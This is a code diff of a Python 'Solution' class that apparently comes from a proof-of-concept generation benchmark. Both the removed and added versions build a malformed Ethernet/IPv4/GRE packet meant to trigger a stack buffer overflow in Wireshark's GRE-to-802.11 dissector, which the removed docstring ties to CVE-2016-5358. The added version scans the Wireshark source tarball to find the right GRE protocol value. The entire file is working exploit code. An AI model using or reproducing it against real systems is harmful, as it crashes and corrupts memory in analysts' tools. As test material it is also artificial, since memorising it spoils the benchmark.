@@ -1,66 +1,73 @@
+import tarfile
+import re
 import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the Stack Buffer Overflow in Wireshark's GRE/802.11 dissector.
-        The vulnerability (related to CVE-2016-5358) occurs when the GRE dissector invokes 
-        the 802.11 dissector (via registered Ethertype 0x2473) without providing the expected 
-        802.11 pseudo-header, leading to type confusion and stack corruption.
-        """
-        
-        # PCAP Global Header
-        # Magic (0xa1b2c3d4), Major(2), Minor(4), Zone(0), SigFigs(0), SnapLen(65535), Network(1=Ethernet)
-        pcap_header = struct.pack('<LHHLLLL', 0xa1b2c3d4, 2, 4, 0, 0, 0xffff, 1)
-        
-        # Construct the malicious packet
-        # Layer 1: Ethernet Header (14 bytes)
-        # Dst: 00:00:00:00:00:00, Src: 00:00:00:00:00:00, Type: 0x0800 (IPv4)
-        eth_header = b'\x00' * 12 + struct.pack('>H', 0x0800)
-        
-        # Layer 3: GRE Header (4 bytes)
-        # Flags/Ver: 0x0000, Protocol: 0x2473 (IEEE 802.11)
-        # 0x2473 is the non-standard Ethertype used by Wireshark for 802.11 over GRE
-        gre_header = struct.pack('>HH', 0x0000, 0x2473)
-        
-        # Layer 4: Payload (802.11 Data)
-        # Provide a small dummy payload. The crash is due to pseudo-header mismatch 
-        # reading/writing stack memory, not necessarily deep packet parsing.
-        payload = b'\x00' * 16
-        
-        # Layer 2: IP Header (20 bytes)
-        # Calculate total length
-        ip_data = gre_header + payload
-        ip_total_len = 20 + len(ip_data)
-        
-        # Helper for IP Checksum
-        def checksum(data):
-            if len(data) % 2 == 1:
-                data += b'\0'
-            s = 0
-            for i in range(0, len(data), 2):
-                w = (data[i] << 8) + data[i+1]
-                s += w
-            s = (s >> 16) + (s & 0xffff)
-            s += (s >> 16)
-            return (~s) & 0xffff
+        etypes_map = {}
+        gre_proto = 0x2988  # Default fallback (ETHERTYPE_IEEE_802_11)
 
-        # IP Header fields: 
-        # VerHL(0x45), ToS(0), Len, ID(0x1337), Frag(0), TTL(64), Proto(47=GRE), Csum(0), Src, Dst
-        # 47 is GRE protocol
-        ip_header_tmpl = struct.pack('>BBHHHBBHII', 
-            0x45, 0, ip_total_len, 0x1337, 0, 64, 47, 0, 0x7F000001, 0x7F000001)
-            
-        csum = checksum(ip_header_tmpl)
-        ip_header = struct.pack('>BBHHHBBHII', 
-            0x45, 0, ip_total_len, 0x1337, 0, 64, 47, csum, 0x7F000001, 0x7F000001)
-            
-        # Assemble Packet Data
-        packet_data = eth_header + ip_header + ip_data
+        try:
+            with tarfile.open(src_path, 'r') as tar:
+                etypes_file = None
+                ieee80211_file = None
+                
+                # Locate necessary files
+                for m in tar.getmembers():
+                    if m.name.endswith('etypes.h'):
+                        etypes_file = m
+                    elif m.name.endswith('packet-ieee80211.c'):
+                        ieee80211_file = m
+                
+                # Parse etypes definitions
+                if etypes_file:
+                    f = tar.extractfile(etypes_file)
+                    content = f.read().decode('utf-8', errors='ignore')
+                    for match in re.finditer(r'#define\s+(ETHERTYPE_[A-Z0-9_]+)\s+(0x[0-9a-fA-F]+)', content):
+                        etypes_map[match.group(1)] = int(match.group(2), 16)
+                
+                # Find the GRE protocol registration for 802.11
+                if ieee80211_file:
+                    f = tar.extractfile(ieee80211_file)
+                    content = f.read().decode('utf-8', errors='ignore')
+                    # Look for dissector_add_uint("gre.proto", VALUE, ...)
+                    match = re.search(r'dissector_add_uint\s*\(\s*"gre.proto"\s*,\s*([A-Za-z0-9_]+)', content)
+                    if match:
+                        val = match.group(1)
+                        if val.startswith('0x'):
+                            gre_proto = int(val, 16)
+                        elif val.isdigit():
+                            gre_proto = int(val)
+                        elif val in etypes_map:
+                            gre_proto = etypes_map[val]
+        except Exception:
+            pass
+
+        # Construct Packet
+        # Ethernet Header (14 bytes): Dest, Src, Type=IPv4
+        eth = b'\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x08\x00'
         
-        # PCAP Packet Header
-        # TsSec(0), TsUsec(0), InclLen, OrigLen
-        packet_len = len(packet_data)
-        pcap_packet_header = struct.pack('<IIII', 0, 0, packet_len, packet_len)
+        # IP Header (20 bytes)
+        # Total Length = 20 (IP) + 4 (GRE) + 7 (Payload) = 31
+        # Protocol = 47 (GRE)
+        ip_tmpl = b'\x45\x00\x00\x1f\x00\x01\x00\x00\x40\x2f\x00\x00\x7f\x00\x00\x01\x7f\x00\x00\x01'
         
-        return pcap_header + pcap_packet_header + packet_data
+        # Calculate IP Checksum
+        s = 0
+        for i in range(0, len(ip_tmpl), 2):
+            w = (ip_tmpl[i] << 8) + ip_tmpl[i+1]
+            s += w
+        s = (s >> 16) + (s & 0xffff)
+        s += (s >> 16)
+        chk = ~s & 0xffff
+        
+        ip = ip_tmpl[:10] + struct.pack('>H', chk) + ip_tmpl[12:]
+        
+        # GRE Header (4 bytes)
+        # Flags=0, Proto=gre_proto
+        gre = b'\x00\x00' + struct.pack('>H', gre_proto)
+        
+        # Payload (7 bytes) - minimal payload to complete the packet
+        payload = b'\x00' * 7
+        
+        return eth + ip + gre + payload
